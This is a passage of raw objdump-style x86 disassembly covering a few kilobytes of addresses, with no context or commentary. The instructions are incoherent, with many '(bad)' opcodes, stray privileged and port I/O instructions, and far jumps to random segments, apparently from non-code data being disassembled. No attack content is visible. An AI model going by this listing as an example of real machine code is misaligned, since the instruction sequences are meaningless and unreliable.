  412894:	mov    edi,DWORD PTR [edx]
  412896:	push   0xfffffff1
  412898:	xor    al,0xa
  41289a:	les    edi,FWORD PTR [esi]
  41289c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41289d:	idiv   BYTE PTR [ebp+0x0]
  4128a0:	adc    dl,dh
  4128a2:	(bad)  
  4128a3:	(bad)  
  4128a4:	bound  edx,QWORD PTR [ebp+0x1e3d0abe]
  4128aa:	inc    ebp
  4128ab:	lds    edi,FWORD PTR [esp+eiz*4-0x7b]
  4128af:	push   esi
  4128b0:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4128b2:	pop    eax
  4128b3:	fild   WORD PTR [eax-0x64dedf3a]
  4128b9:	xlat   BYTE PTR ds:[ebx]
  4128ba:	mov    ecx,DWORD PTR [ebp-0x2c]
  4128bd:	je     0x412860
  4128bf:	sbb    eax,0x962965a1
  4128c4:	shl    BYTE PTR [ebp+edi*4-0x73],cl
  4128c8:	pop    ebp
  4128c9:	jns    0x4128b2
  4128cb:	dec    edx
  4128cc:	in     al,dx
  4128cd:	daa    
  4128ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4128cf:	scas   eax,DWORD PTR es:[edi]
  4128d0:	out    dx,eax
  4128d1:	mov    bl,0xce
  4128d3:	or     eax,0xd607bcef
  4128d8:	mov    cl,0x29
  4128da:	inc    ebp
  4128db:	fsubr  st(3),st
  4128dd:	lea    ebx,[ecx-0x5887bb1b]
  4128e3:	enter  0xd3c8,0x36
  4128e7:	hlt    
  4128e8:	ret    0xad2
  4128eb:	jle    0x4128e7
  4128ed:	js     0x4128a8
  4128ef:	cmp    esi,DWORD PTR [edx+esi*2+0x22]
  4128f3:	(bad)  
  4128f4:	bnd ja 0x4128c4
  4128f7:	adc    DWORD PTR [ebx-0x49d2e588],0x4fdae79c
  412901:	in     eax,0x1a
  412903:	dec    esi
  412904:	mov    es,WORD PTR [edx+0x35]
  412907:	mov    edi,0x2e3b96f7
  41290c:	jmp    0xe8d1:0xa5eaef1a
  412913:	(bad)  
  412915:	out    dx,al
  412916:	jle    0x4128e1
  412918:	xor    ebx,edx
  41291a:	out    0xe7,eax
  41291c:	test   BYTE PTR [ebx+edx*2],dh
  41291f:	or     ebx,esp
  412921:	fwait
  412922:	cmp    eax,0xa345158
  412927:	pop    esp
  412928:	clc    
  412929:	in     al,0x57
  41292b:	dec    edi
  41292c:	lea    esp,[eax+ebp*2-0x6b98ceff]
  412933:	cmp    BYTE PTR [edx+0x40],ah
  412936:	ds jge 0x4128ee
  412939:	sbb    eax,0x7c908584
  41293e:	int3   
  41293f:	mov    DWORD PTR [edi+ecx*1+0x55c97cdb],ebp
  412946:	ins    BYTE PTR es:[edi],dx
  412947:	std    
  412948:	cmp    eax,esp
  41294a:	pushf  
  41294b:	loop   0x4128ef
  41294d:	ds addr16 push ecx
  412950:	sub    eax,0xa4de70db
  412955:	cwde   
  412956:	push   0xfffffff8
  412958:	and    dl,ah
  41295a:	jno    0x4129d8
  41295c:	push   es
  41295d:	mov    ds:0x1a74f008,eax
  412962:	test   DWORD PTR [esi+ebx*2-0x4b],edi
  412966:	test   eax,0xc31a53f7
  41296b:	retf   0x5a25
  41296e:	pop    edi
  41296f:	jmp    0x29a57b8c
  412974:	sbb    DWORD PTR [esi],ebp
  412976:	addr16 xchg bh,ah
  412979:	push   ebp
  41297a:	cmp    BYTE PTR [ebx-0x4d],cl
  41297d:	and    al,0x33
  41297f:	fisubr DWORD PTR [eax+0x4fc7d6a8]
  412985:	mov    ah,0x67
  412987:	push   esi
  412988:	jmp    0x5e4a8cc6
  41298d:	xor    esi,DWORD PTR [eax-0x7b35a5bb]
  412993:	pop    ds
  412994:	pop    ss
  412995:	jecxz  0x4129cd
  412997:	mov    ds:0xfc2e4a14,eax
  41299c:	xor    dh,BYTE PTR [eax]
  41299e:	dec    edi
  41299f:	aad    0xca
  4129a1:	push   ebx
  4129a2:	adc    BYTE PTR [edx-0x669011fa],ch
  4129a8:	ret    0xaf2d
  4129ab:	mov    esi,0xd773211e
  4129b0:	sub    ah,ch
  4129b2:	inc    eax
  4129b3:	xchg   DWORD PTR ds:0xc357275e,eax
  4129b9:	or     al,0x13
  4129bb:	or     al,cl
  4129bd:	push   eax
  4129be:	enter  0x409a,0xa2
  4129c2:	cmp    eax,0xacc05481
  4129c7:	lds    edx,FWORD PTR [esi+0x72aed564]
  4129cd:	inc    esp
  4129ce:	push   esp
  4129cf:	mov    BYTE PTR [edi+0x70],bh
  4129d2:	pop    esp
  4129d3:	add    ecx,DWORD PTR [edx+0x4746608e]
  4129d9:	xchg   ebp,eax
  4129da:	xor    al,0x48
  4129dc:	stos   DWORD PTR es:[edi],eax
  4129dd:	dec    esp
  4129de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4129df:	scas   eax,DWORD PTR es:[edi]
  4129e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4129e1:	jecxz  0x412988
  4129e3:	inc    edx
  4129e4:	or     ecx,ebp
  4129e6:	ds cmp ecx,esp
  4129e9:	addr16 in eax,dx
  4129eb:	(bad)  
  4129ec:	mov    eax,0x76f366e7
  4129f1:	add    esi,DWORD PTR [esi-0x70]
  4129f4:	xchg   edi,eax
  4129f5:	jg     0x412a14
  4129f7:	mov    edx,0x643a07c5
  4129fc:	push   ds
  4129fd:	aad    0xb0
  4129ff:	xor    al,0x71
  412a01:	lods   eax,DWORD PTR ds:[esi]
  412a02:	daa    
  412a03:	aas    
  412a04:	or     eax,DWORD PTR [ebx]
  412a06:	mov    fs,WORD PTR [esi+0x6dc93478]
  412a0c:	cli    
  412a0d:	xchg   ecx,eax
  412a0e:	leave  
  412a0f:	dec    eax
  412a10:	(bad)  
  412a11:	rcr    BYTE PTR [ebp-0x3a],0x6b
  412a15:	sahf   
  412a16:	in     al,dx
  412a17:	inc    esp
  412a18:	loop   0x4129e1
  412a1a:	std    
  412a1b:	icebp  
  412a1c:	jg     0x4129d2
  412a1e:	mov    al,ds:0xf7b3de22
  412a23:	xor    DWORD PTR [edi+0x2a],esp
  412a26:	(bad)  
  412a28:	xchg   ebp,eax
  412a29:	outs   dx,DWORD PTR ds:[esi]
  412a2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a2b:	mov    ds:0x914a5646,al
  412a30:	leave  
  412a31:	cmp    DWORD PTR [edi+0x4a9d8215],0xffffffcd
  412a38:	lods   al,BYTE PTR ds:[esi]
  412a39:	sub    bh,BYTE PTR [esi+0x4e1949ac]
  412a3f:	mov    al,0x45
  412a41:	push   eax
  412a42:	cwde   
  412a43:	or     eax,0x85d3cfed
  412a48:	mov    cl,0x19
  412a4a:	in     al,0xa3
  412a4c:	xchg   ebx,eax
  412a4d:	mov    eax,esi
  412a4f:	inc    esi
  412a50:	jb     0x412a3c
  412a52:	icebp  
  412a53:	cmp    edi,esp
  412a55:	xor    al,BYTE PTR [ebp-0x68]
  412a58:	push   0x4a
  412a5a:	fld    st(5)
  412a5c:	ret    
  412a5d:	fdiv   QWORD PTR [ebx-0x4f1b119e]
  412a63:	pop    es
  412a64:	and    ebx,DWORD PTR [edx]
  412a66:	leave  
  412a67:	push   ss
  412a68:	pushf  
  412a69:	xchg   esi,eax
  412a6a:	cmp    DWORD PTR [edi+0x51afc297],ebp
  412a70:	push   esp
  412a71:	mov    ds:0x945ae3b7,eax
  412a76:	jecxz  0x412a54
  412a78:	xor    al,BYTE PTR [ebp-0x68a660c6]
  412a7e:	enter  0x1146,0xbd
  412a82:	int3   
  412a83:	dec    edx
  412a84:	xchg   edx,eax
  412a85:	push   edx
  412a86:	(bad)  
  412a87:	(bad)  
  412a88:	lea    edi,[ebx+edx*8]
  412a8b:	mov    eax,DWORD PTR [edi+0x4a4b5af1]
  412a91:	xchg   BYTE PTR [eax],ah
  412a93:	popf   
  412a94:	adc    BYTE PTR [esi-0x2f7bfd75],dl
  412a9a:	js     0x412a5a
  412a9c:	jnp    0x412ac5
  412a9e:	push   esp
  412a9f:	rcl    DWORD PTR [edx],cl
  412aa1:	shl    ebx,0x7e
  412aa4:	xchg   BYTE PTR ds:0xdc385bd2,al
  412aaa:	jg     0x412a7a
  412aac:	scas   al,BYTE PTR es:[edi]
  412aad:	icebp  
  412aae:	jno    0x412af0
  412ab0:	lea    ebx,[edi-0x2e997cd5]
  412ab6:	cmp    eax,0x6a8f3750
  412abb:	std    
  412abc:	jo     0x412abe
  412abe:	das    
  412abf:	ds (bad) 
  412ac1:	retf   0xe68d
  412ac4:	out    dx,al
  412ac5:	test   DWORD PTR [ecx+0x22],esi
  412ac8:	fwait
  412ac9:	push   ds
  412aca:	or     DWORD PTR [ecx-0x340dc2f9],ecx
  412ad0:	and    dh,dl
  412ad2:	pop    esi
  412ad3:	sbb    al,0x29
  412ad5:	test   al,0xef
  412ad7:	sub    al,0x4f
  412ad9:	jbe    0x412afa
  412adb:	fucomip st,st(1)
  412add:	pop    ebx
  412ade:	dec    esp
  412adf:	lods   al,BYTE PTR ds:[esi]
  412ae0:	and    DWORD PTR [edi-0x78],0xc4f7e78b
  412ae7:	inc    ecx
  412ae8:	and    al,0xe6
  412aea:	cmp    esi,DWORD PTR [edi-0x6a]
  412aed:	enter  0xf32c,0x79
  412af1:	(bad)  
  412af2:	fisttp DWORD PTR [esi+0xae5e9f2]
  412af8:	add    ecx,DWORD PTR [ebx]
  412afa:	lods   al,BYTE PTR ds:[esi]
  412afb:	fnstsw WORD PTR [ebx-0x51]
  412afe:	and    al,BYTE PTR [ebx+ebp*2-0x609f1214]
  412b05:	mov    cl,0xe6
  412b07:	mov    DWORD PTR [eax],ecx
  412b09:	xlat   BYTE PTR ds:[ebx]
  412b0a:	or     bl,BYTE PTR [ebp+0x3544e7e3]
  412b10:	fsub   DWORD PTR [edx]
  412b12:	icebp  
  412b13:	mov    eax,0x23756dce
  412b18:	jle    0x412b32
  412b1a:	or     bl,dl
  412b1c:	sub    BYTE PTR [ebp-0x6a],0xda
  412b20:	jne    0x412ab6
  412b22:	dec    edi
  412b23:	(bad)  
  412b24:	call   0xf5ba:0xa2bac58f
  412b2b:	jno    0x412b04
  412b2d:	sti    
  412b2e:	xor    cl,BYTE PTR [edi+0x49]
  412b31:	and    DWORD PTR [esi-0x3d],esp
  412b34:	(bad)  
  412b36:	and    esp,ecx
  412b38:	popa   
  412b39:	mov    esi,0x2a7826ea
  412b3e:	retf   0xfbe9
  412b41:	out    dx,eax
  412b42:	(bad)  
  412b43:	pop    ds
  412b44:	xor    eax,0xf028b0a4
  412b49:	lods   eax,DWORD PTR ds:[esi]
  412b4a:	gs sahf 
  412b4c:	jmp    0x412b12
  412b4e:	cwde   
  412b4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b50:	ins    DWORD PTR es:[edi],dx
  412b51:	daa    
  412b52:	xchg   BYTE PTR [eax],al
  412b54:	retf   0x23c0
  412b57:	data16 loop 0x412b5d
  412b5a:	fisubr WORD PTR [eax-0x52a0fd80]
  412b60:	jbe    0x412af7
  412b62:	aam    0xe3
  412b64:	jne    0x412b2d
  412b66:	mov    ah,0x74
  412b68:	lods   al,BYTE PTR ds:[esi]
  412b69:	sbb    cl,0x19
  412b6c:	sbb    eax,0xde7f435c
  412b71:	mov    ebx,0xec65c219
  412b76:	pop    ecx
  412b77:	jae    0x412b9d
  412b79:	pop    ss
  412b7a:	or     DWORD PTR [eax],edx
  412b7c:	test   al,0x73
  412b7e:	mov    eax,0x5708ff0c
  412b83:	dec    esp
  412b84:	mov    ds:0x7d3cf910,al
  412b89:	dec    edx
  412b8a:	lds    esi,FWORD PTR [esi+ebp*2-0x3e]
  412b8e:	pop    es
  412b8f:	scas   eax,DWORD PTR es:[edi]
  412b90:	mov    ah,BYTE PTR [esi+0x5c]
  412b93:	jno    0x412b68
  412b95:	xor    eax,0xdb4d6b6e
  412b9a:	or     eax,0xf7ac833e
  412b9f:	cmp    eax,0xd26fc01e
  412ba4:	test   al,0x5a
  412ba6:	xchg   esi,eax
  412ba7:	xor    al,0x3f
  412ba9:	stos   BYTE PTR es:[edi],al
  412baa:	dec    ebx
  412bab:	pop    edx
  412bac:	push   edx
  412bad:	push   ds
  412bae:	retf   
  412baf:	inc    edi
  412bb0:	push   edi
  412bb1:	mov    eax,ds:0xf5fb9cc9
  412bb6:	mov    ecx,0xe56ebfc3
  412bbb:	mul    DWORD PTR [edx-0x7c4c724f]
  412bc1:	xor    esi,DWORD PTR [ebx+0x2f]
  412bc4:	iret   
  412bc5:	mov    esi,0x95a77528
  412bca:	jno    0x412b4f
  412bcc:	push   ebp
  412bcd:	aam    0xa
  412bcf:	(bad)  
  412bd1:	les    edx,FWORD PTR [edi+0x2197d87e]
  412bd7:	and    bl,BYTE PTR [edx+0x64]
  412bda:	or     esp,ebx
  412bdc:	mov    bl,0x73
  412bde:	retf   0x67b3
  412be1:	call   0x7ccc:0xacb5f242
  412be8:	add    ebp,DWORD PTR [edi]
  412bea:	pop    ds
  412beb:	xchg   ebp,eax
  412bec:	fiadd  WORD PTR [ebx-0x38]
  412bef:	push   ebx
  412bf0:	repz retf 0xf4d5
  412bf4:	jecxz  0x412c37
  412bf6:	pop    esp
  412bf7:	mov    ds:0x61e9327f,eax
  412bfc:	and    eax,0x30e87d00
  412c01:	addr16 (bad) 
  412c03:	jmp    DWORD PTR [esi+eiz*2]
  412c06:	adc    BYTE PTR [edx],bl
  412c08:	pop    ebx
  412c09:	addr16 pop ebp
  412c0b:	lods   ax,WORD PTR ds:[esi]
  412c0d:	adc    DWORD PTR [ebx+0x376a7c8f],edi
  412c13:	ret    
  412c14:	sbb    DWORD PTR ds:0xf77f161b,esp
  412c1a:	jns    0x412c87
  412c1c:	pusha  
  412c1d:	in     eax,0xc2
  412c1f:	or     BYTE PTR [esi+ebx*1+0x41ef5e8a],ah
  412c26:	dec    ebp
  412c27:	rol    ah,1
  412c29:	jb     0x412c10
  412c2b:	jge    0x412ca9
  412c2d:	inc    edi
  412c2e:	aaa    
  412c2f:	mov    cl,0x9f
  412c31:	dec    edi
  412c32:	repz ror BYTE PTR [ebx-0x7],0x6e
  412c37:	inc    edi
  412c38:	sbb    eax,0x3235ec1
  412c3d:	xor    DWORD PTR [esi],ebx
  412c3f:	std    
  412c40:	sbb    edx,esp
  412c42:	jne    0x412c36
  412c44:	cmp    esp,DWORD PTR [edi+0xa]
  412c47:	retf   0x267f
  412c4a:	call   DWORD PTR [ebp+0x320cad06]
  412c50:	jns    0x412c26
  412c52:	into   
  412c53:	mov    ?,WORD PTR [ebx-0x2f05922b]
  412c59:	cmp    dh,bh
  412c5b:	je     0x412c0c
  412c5d:	or     ecx,DWORD PTR [esi-0x1a5ce9b7]
  412c63:	bound  eax,QWORD PTR [ecx-0x26501c32]
  412c69:	mov    eax,esp
  412c6b:	jae    0x412cb0
  412c6d:	int3   
  412c6e:	mov    eax,ds:0x3719f5a2
  412c73:	aad    0x29
  412c75:	imul   esp,DWORD PTR [esi-0x71],0x10
  412c79:	sub    esp,edi
  412c7b:	jnp    0x412c33
  412c7d:	sahf   
  412c7e:	adc    ch,BYTE PTR [ebp+0x2]
  412c81:	and    cl,BYTE PTR [ebx+0x2f46510f]
  412c87:	and    ch,BYTE PTR [esi]
  412c89:	aam    0x87
  412c8b:	push   edx
  412c8c:	adc    esp,DWORD PTR [ecx-0x3d]
  412c8f:	loopne 0x412d01
  412c91:	pushf  
  412c92:	mov    cl,0x8
  412c94:	inc    eax
  412c95:	ss push eax
  412c97:	loope  0x412c95
  412c99:	outs   dx,BYTE PTR ds:[esi]
  412c9a:	stos   DWORD PTR es:[edi],eax
  412c9b:	push   esp
  412c9c:	sbb    al,BYTE PTR [esi]
  412c9e:	mov    bh,0x3c
  412ca0:	pop    ds
  412ca1:	lock sar DWORD PTR [esp+ebp*1-0x372864b8],1
  412ca9:	jmp    0x89d40675
  412cae:	cmp    eax,0xa6e02f9c
  412cb3:	dec    esp
  412cb4:	clc    
  412cb5:	mov    ds:0x4141dbb4,al
  412cba:	sti    
  412cbb:	jne    0x412d0f
  412cbd:	pop    ss
  412cbe:	add    ebx,eax
  412cc0:	push   ecx
  412cc1:	pushf  
  412cc2:	icebp  
  412cc3:	push   ds
  412cc4:	mov    ?,WORD PTR [edx+0x18c22fa3]
  412cca:	stc    
  412ccb:	gs add al,0xe4
  412cce:	push   ebp
  412ccf:	cmp    ah,0xc7
  412cd2:	sbb    DWORD PTR [edx+0x1cb9c941],esi
  412cd8:	mov    ds,WORD PTR [ecx+0x4]
  412cdb:	mov    bl,0x57
  412cdd:	push   eax
  412cde:	mov    bl,0xfd
  412ce0:	mov    cl,0x23
  412ce2:	dec    ebx
  412ce3:	lods   al,BYTE PTR ds:[esi]
  412ce4:	inc    edx
  412ce5:	data16 or ch,BYTE PTR [edx+eiz*2]
  412ce9:	shl    DWORD PTR [bx+di-0x3c6d],1
  412cee:	add    eax,0x7e833c5
  412cf3:	cli    
  412cf4:	rol    esp,0xec
  412cf7:	jnp    0x412ceb
  412cf9:	push   eax
  412cfa:	mov    cl,0x66
  412cfc:	sahf   
  412cfd:	jmp    0x39528096
  412d02:	inc    edx
  412d03:	cmc    
  412d04:	xchg   ebx,eax
  412d05:	rcr    DWORD PTR [edx+0xf],1
  412d08:	jecxz  0x412d71
  412d0a:	or     DWORD PTR [edx+0x47],edi
  412d0d:	scas   al,BYTE PTR es:[edi]
  412d0e:	idiv   BYTE PTR [ebx+0x44]
  412d11:	pop    eax
  412d12:	jns    0x412cae
  412d14:	inc    esp
  412d15:	sbb    al,0xcb
  412d17:	call   0xeecf:0x44537c5e
  412d1e:	scas   al,BYTE PTR es:[edi]
  412d1f:	mov    edx,0x715cc220
  412d24:	pop    ds
  412d25:	jo     0x412d52
  412d27:	push   esp
  412d28:	cmp    eax,0xbdd1efe5
  412d2d:	mov    ch,0x7
  412d2f:	and    edi,DWORD PTR [ebp+0x11]
  412d32:	add    dh,BYTE PTR [ebx+0x755e46c5]
  412d38:	rol    BYTE PTR [ecx],0x32
  412d3b:	outs   dx,BYTE PTR ds:[esi]
  412d3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d3d:	popf   
  412d3e:	mov    cl,0x97
  412d40:	xchg   esi,eax
  412d41:	jp     0x412d00
  412d43:	popa   
  412d44:	test   BYTE PTR [esi+0x28],bh
  412d47:	jmp    0x7a2f64fc
  412d4c:	pushf  
  412d4d:	ret    0x6062
  412d50:	mov    esi,0xff8e70d1
  412d55:	mov    BYTE PTR [edx-0x5922d031],cl
  412d5b:	adc    bl,bl
  412d5d:	pop    ecx
  412d5e:	gs call 0xcb6a5c6b
  412d64:	mov    DWORD PTR [edx+0x62],ebx
  412d67:	sub    bh,ah
  412d69:	push   es
  412d6a:	or     eax,0x190253ad
  412d6f:	sbb    eax,0x14ffa91b
  412d74:	cmp    esi,ebx
  412d76:	mov    al,ds:0x40f23784
  412d7b:	popf   
  412d7c:	test   al,0xb1
  412d7e:	sbb    DWORD PTR [ecx+0x479f3625],edi
  412d84:	jge    0x412d53
  412d86:	hlt    
  412d87:	into   
  412d88:	mov    ch,0xee
  412d8a:	and    eax,0xe70c8d7e
  412d8f:	cwde   
  412d90:	hlt    
  412d91:	popf   
  412d92:	xchg   ecx,eax
  412d93:	sbb    edi,DWORD PTR [eax-0x1b]
  412d96:	or     esp,esp
  412d98:	push   es
  412d99:	sub    eax,0xbcc110e5
  412d9e:	(bad)  
  412d9f:	cld    
  412da0:	ror    esp,0x46
  412da3:	test   al,0xef
  412da5:	xchg   esi,eax
  412da6:	(bad)  
  412da7:	add    eax,0x90cc8513
  412dac:	in     al,dx
  412dad:	lock push ss
  412daf:	loopne 0x412d79
  412db1:	mov    ch,0xcc
  412db3:	and    ecx,DWORD PTR [edi]
  412db5:	nop
  412db6:	mov    eax,0x8cd837a9
  412dbb:	aam    0x1
  412dbd:	sahf   
  412dbe:	pusha  
  412dbf:	mov    ecx,0x5d0c0f5
  412dc4:	repz pop ebx
  412dc6:	jmp    0x412de1
  412dc8:	jl     0x412dc4
  412dca:	icebp  
  412dcb:	ficomp WORD PTR ds:0xb3fa6be1
  412dd2:	ret    
  412dd3:	adc    BYTE PTR [edx],bl
  412dd5:	cdq    
  412dd6:	or     BYTE PTR [edx-0x4c],ah
  412dd9:	pop    ebp
  412dda:	jg     0x412ddf
  412ddc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ddd:	sbb    BYTE PTR [edx+0x75127579],0xec
  412de4:	out    dx,al
  412de5:	(bad)  
  412de6:	fcomp  st(3)
  412de8:	dec    ebx
  412de9:	jle    0x412e22
  412deb:	xchg   edx,eax
  412dec:	mov    dh,0x16
  412dee:	ret    0x6085
  412df1:	xchg   ebx,eax
  412df2:	sbb    bl,dl
  412df4:	xchg   ebx,eax
  412df5:	neg    DWORD PTR [ebx-0x12]
  412df8:	mov    BYTE PTR [esi+0x59],0xe8
  412dfc:	pop    edx
  412dfd:	dec    edx
  412dfe:	mov    al,BYTE PTR [esi-0x78ea047c]
  412e04:	sbb    esp,DWORD PTR [edx+0x2a]
  412e07:	inc    edi
  412e08:	push   ss
  412e09:	lldt   dx
  412e0c:	pop    ds
  412e0d:	mov    DWORD PTR [esi+edx*4-0x2d],eax
  412e11:	dec    edx
  412e12:	(bad)  
  412e13:	loope  0x412e34
  412e15:	rcr    DWORD PTR [esi+esi*8],cl
  412e18:	push   esp
  412e19:	xchg   esp,eax
  412e1a:	cld    
  412e1b:	and    DWORD PTR ds:[ebx],esp
  412e1e:	out    0x9f,al
  412e20:	cs aam 0x40
  412e23:	xor    cl,BYTE PTR [edx+0x5d8c5b30]
  412e29:	mov    DWORD PTR [esi+0x28],eax
  412e2c:	jp     0x412ddc
  412e2e:	dec    edi
  412e2f:	pop    eax
  412e30:	mov    ah,0x7
  412e32:	or     DWORD PTR [esi+eiz*1],esi
  412e35:	jge    0x412df9
  412e37:	enter  0xc31b,0x4a
  412e3b:	popa   
  412e3c:	xchg   BYTE PTR [eax-0x52],al
  412e3f:	adc    al,0x4d
  412e41:	add    DWORD PTR [edi+0x768259bc],edx
  412e47:	cmp    eax,DWORD PTR [ecx+0x436ee741]
  412e4d:	mov    dh,0x82
  412e4f:	mov    bh,0x96
  412e51:	(bad)  
  412e52:	lock jbe 0x412e4d
  412e55:	mov    fs,WORD PTR [ebx-0x64ff79c0]
  412e5b:	dec    eax
  412e5c:	cmp    BYTE PTR [edi],0xd9
  412e5f:	fdiv   DWORD PTR [edi]
  412e61:	cli    
  412e62:	inc    ecx
  412e63:	jnp    0x412eb4
  412e65:	ror    BYTE PTR [edi-0x7d],cl
  412e68:	sbb    BYTE PTR [edi+ecx*2],bh
  412e6b:	jl     0x412e8b
  412e6d:	xchg   edi,eax
  412e6e:	push   ds
  412e6f:	cmp    BYTE PTR [ecx+eiz*1-0x3a1d7692],bh
  412e76:	rol    DWORD PTR [ecx+0x7cee46ff],1
  412e7c:	(bad)  
  412e7d:	scas   eax,DWORD PTR es:[edi]
  412e7e:	dec    ebx
  412e7f:	inc    esi
  412e80:	(bad)  
  412e81:	fsubr  st,st(6)
  412e83:	inc    ebp
  412e84:	and    al,0x17
  412e86:	mov    ebp,0x3af67f2b
  412e8b:	dec    ebp
  412e8c:	cmp    BYTE PTR [ecx],dl
  412e8e:	aam    0x3e
  412e90:	mov    ebp,0xdc69fb22
  412e95:	and    ebx,DWORD PTR [edi+ebp*1]
  412e98:	test   DWORD PTR [edx+0x5d],0x924edc12
  412e9f:	out    0x18,eax
  412ea1:	mov    edi,0x6a0b28a8
  412ea6:	jp     0x412ef9
  412ea8:	inc    ebp
  412ea9:	loope  0x412f26
  412eab:	sahf   
  412eac:	cmp    BYTE PTR [ebp+0x704aee79],0x34
  412eb3:	xor    BYTE PTR [ecx-0x8],bl
  412eb6:	dec    ebp
  412eb7:	cmc    
  412eb8:	fist   WORD PTR [esi+0x2e]
  412ebb:	sub    dl,BYTE PTR [edi]
  412ebd:	repz cs push esi
  412ec0:	sbb    ah,dh
  412ec2:	mov    bl,0x25
  412ec4:	cld    
  412ec5:	lahf   
  412ec6:	push   ds
  412ec7:	jae    0x412eec
  412ec9:	push   0x1de11c32
  412ece:	aam    0x2b
  412ed0:	pushf  
  412ed1:	sub    BYTE PTR [esp+ecx*4+0x30],bl
  412ed5:	repnz sbb al,0x48
  412ed8:	adc    esi,DWORD PTR [edx-0x77]
  412edb:	stos   BYTE PTR es:[edi],al
  412edc:	add    eax,0x175f397d
  412ee1:	(bad)  
  412ee2:	jo     0x412ea5
  412ee4:	sbb    eax,DWORD PTR [ecx+eiz*1-0x2984c0ac]
  412eeb:	jns    0x412e82
  412eed:	es push edx
  412eef:	push   esi
  412ef0:	sbb    BYTE PTR [edx],dh
  412ef2:	out    dx,al
  412ef3:	(bad)  
  412ef4:	lock shr dl,1
  412ef7:	jge    0x412e8e
  412ef9:	sar    BYTE PTR [edi],0x3b
  412efc:	mov    dh,0xef
  412efe:	cmp    eax,DWORD PTR [ebx-0x7c]
  412f01:	add    BYTE PTR [ebx],bh
  412f03:	ins    DWORD PTR es:[edi],dx
  412f04:	inc    esp
  412f05:	mul    DWORD PTR [ebx-0x1236313b]
  412f0b:	clc    
  412f0c:	pushf  
  412f0d:	js     0x412f7d
  412f0f:	and    DWORD PTR [esi],eax
  412f11:	call   0x8718a6b
  412f16:	rol    DWORD PTR [ebp-0x15],1
  412f19:	xor    BYTE PTR [ebx],0x33
  412f1c:	outs   dx,BYTE PTR ds:[esi]
  412f1d:	fld    TBYTE PTR [eax]
  412f1f:	scas   eax,DWORD PTR es:[edi]
  412f20:	lods   al,BYTE PTR ds:[esi]
  412f21:	xchg   esp,eax
  412f22:	ins    BYTE PTR es:[edi],dx
  412f23:	loop   0x412f36
  412f25:	loop   0x412f48
  412f27:	adc    DWORD PTR [ecx+0x9],eax
  412f2a:	and    dh,BYTE PTR [edx-0x34e1cb1b]
  412f30:	push   0x76
  412f32:	push   edi
  412f33:	rcr    BYTE PTR ds:0xd7c9be76,0x94
  412f3a:	fwait
  412f3b:	xor    al,0xe
  412f3d:	push   0x975469cb
  412f42:	and    al,BYTE PTR [ebx+0x358830bc]
  412f48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f49:	pop    ss
  412f4a:	fnstenv [edi+eiz*8]
  412f4d:	push   ss
  412f4e:	jp     0x412f60
  412f50:	push   ebp
  412f51:	push   ss
  412f52:	pop    edx
  412f53:	or     ah,BYTE PTR [ebp-0x66213c1d]
  412f59:	jo     0x412fa4
  412f5b:	sub    eax,0xca7371a2
  412f60:	call   DWORD PTR ds:0x9d3fe0eb
  412f66:	pop    es
  412f67:	(bad)  
  412f68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f69:	fcmovnbe st,st(6)
  412f6b:	rcr    DWORD PTR [eax-0x68a469ef],cl
  412f71:	lock mov ds:0xd4d4ada2,al
  412f77:	sti    
  412f78:	inc    ecx
  412f79:	aaa    
  412f7a:	mov    dh,0x93
  412f7c:	mov    bl,0xe2
  412f7e:	inc    ecx
  412f7f:	bound  edi,QWORD PTR [ecx]
  412f81:	scas   eax,DWORD PTR es:[edi]
  412f82:	dec    ebx
  412f83:	fidivr DWORD PTR [edx+eiz*2]
  412f86:	in     al,0x19
  412f88:	pusha  
  412f89:	iret   
  412f8a:	push   esi
  412f8b:	fild   QWORD PTR [edi-0x4341e496]
  412f91:	mov    BYTE PTR [ecx],ch
  412f93:	out    0xbb,al
  412f95:	inc    ebp
  412f96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f97:	pop    ds
  412f98:	sti    
  412f99:	les    esi,FWORD PTR [ebx+edx*2-0x40]
  412f9d:	sets   BYTE PTR [ecx+0x2a]
  412fa1:	call   0x80d034a6
  412fa6:	int    0x0
  412fa8:	push   es
  412fa9:	sub    bl,0xb5
  412fac:	or     al,0xf3
  412fae:	lods   al,BYTE PTR ds:[esi]
  412faf:	pop    es
  412fb0:	jmp    0x4956:0xd15112c5
  412fb7:	scas   al,BYTE PTR es:[edi]
  412fb8:	xor    eax,0xa9331963
  412fbd:	inc    esi
  412fbe:	jmp    DWORD PTR [eax]
  412fc0:	cwde   
  412fc1:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412fc3:	data16 clc 
  412fc5:	cmp    al,BYTE PTR [ecx-0x48]
  412fc8:	mov    edx,0x32891dd5
  412fcd:	aas    
  412fce:	cli    
  412fcf:	cmp    ebp,DWORD PTR [ecx+0x17]
  412fd2:	pop    ds
  412fd3:	shl    BYTE PTR [esi+eiz*8-0x10],1
  412fd7:	hlt    
  412fd8:	sahf   
  412fd9:	enter  0x56ae,0x93
  412fdd:	inc    edx
  412fde:	aas    
  412fdf:	or     al,0x7
  412fe1:	adc    al,0xfa
  412fe3:	inc    ebp
  412fe4:	push   esp
  412fe5:	shr    BYTE PTR [ebx+0x34],1
  412fe8:	ret    
  412fe9:	scas   eax,DWORD PTR es:[edi]
  412fea:	jp     0x413047
  412fec:	cmp    al,0x21
  412fee:	xchg   edi,eax
  412fef:	fcomp  QWORD PTR [edx-0x32fcc542]
  412ff5:	pop    ebx
  412ff6:	repnz fbld TBYTE PTR [ecx]
  412ff9:	les    ebp,FWORD PTR [edx]
  412ffb:	out    dx,al
  412ffc:	das    
  412ffd:	sbb    bh,al
  412fff:	retf   
  413000:	sub    edi,DWORD PTR [edi-0x2f]
  413003:	jle    0x412ff8
  413005:	adc    ch,BYTE PTR [eax]
  413007:	mov    al,0x87
  413009:	aam    0xfa
  41300b:	and    bh,BYTE PTR [edi+0x57]
